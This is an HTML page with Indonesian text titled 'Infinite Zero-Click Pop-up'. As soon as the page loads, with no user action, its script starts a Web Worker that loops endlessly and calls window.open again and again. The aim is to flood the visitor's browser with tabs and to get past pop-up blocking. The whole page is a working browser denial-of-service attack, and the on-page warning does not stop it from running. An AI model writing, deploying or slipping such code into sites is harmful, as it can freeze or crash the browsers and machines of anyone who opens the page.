<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Infinite Zero-Click Pop-up</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; text-align: center; overflow: hidden; }
        .panel { background: #1e1e1e; padding: 40px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); max-width: 600px; width: 100%; border: 1px solid #333; }
        h1 { font-size: 28px; color: #ff4444; margin-bottom: 15px; text-shadow: 0 0 10px #ff4444; }
        p { font-size: 15px; color: #aaa; margin-bottom: 25px; line-height: 1.6; }
        #status { margin-top: 20px; font-weight: bold; color: #ff9800; font-size: 14px; font-family: monospace; background: #111; padding: 10px; border-radius: 6px; }
        .warning { background: #331111; color: #ff4444; padding: 10px; border-radius: 6px; margin-bottom: 20px; font-size: 13px; border: 1px solid #ff4444; }
    </style>
</head>

<body>
<div class="panel" id="main-panel">
    <div class="warning">⚠️ PERINGATAN: Halaman ini akan mencoba membuka tab tanpa henti secara otomatis!</div>
    <h1>Infinite Zero-Click Pop-up</h1>
    <p>Menggunakan Web Worker + Microtask untuk membanjiri tab.</p>
    <div id="status" role="status">Memuat halaman...</div>
</div>

<script>
    const statusDiv = document.getElementById("status");
    let totalTabs = 0;

    // 1. Fungsi Membuka Tab
    function bukaTab() {
        try {
            const win = window.open('https://google.com', '_blank');
            if (win) {
                totalTabs++;
                // Update status UI setiap 10 tab
                if (totalTabs % 10 === 0) {
                    statusDiv.textContent = `Telah membuka ${totalTabs} tab...`;
                }
            }
        } catch (e) {}
    }

    // 2. Pemicu Loop Infinite via Web Worker
    function startInfiniteLoop() {
        statusDiv.textContent = "MEMULAI INFINITE POP-UP!";
        statusDiv.style.color = "#ff4444";

        // Kode Worker: Mengirim sinyal 'OPEN' secepat mungkin tanpa henti
        const workerCode = `
            self.onmessage = function(e) {
                if (e.data === 'START') {
                    while(true) {
                        self.postMessage('OPEN');
                    }
                }
            };
        `;
        
        try {
            const workerBlob = new Blob([workerCode], { type: 'application/javascript' });
            const worker = new Worker(URL.createObjectURL(workerBlob));

            // Terima sinyal dan buka tab via Microtask (Race Condition)
            worker.onmessage = function(e) {
                if (e.data === 'OPEN') {
                    queueMicrotask(bukaTab);
                }
            };

            // Mulai Worker
            worker.postMessage('START');
        } catch (e) {
            statusDiv.textContent = "Gagal memulai Worker: " + e.message;
            statusDiv.style.color = "#f00";
        }
    }

    // 3. EKSEKUSI OTOMATIS SAAT DOM SIAP (ZERO-CLICK)
    window.addEventListener("DOMContentLoaded", () => {
        // Jeda sedikit agar render UI selesai
        setTimeout(startInfiniteLoop, 100);
    });
</script>
</body>
</html>
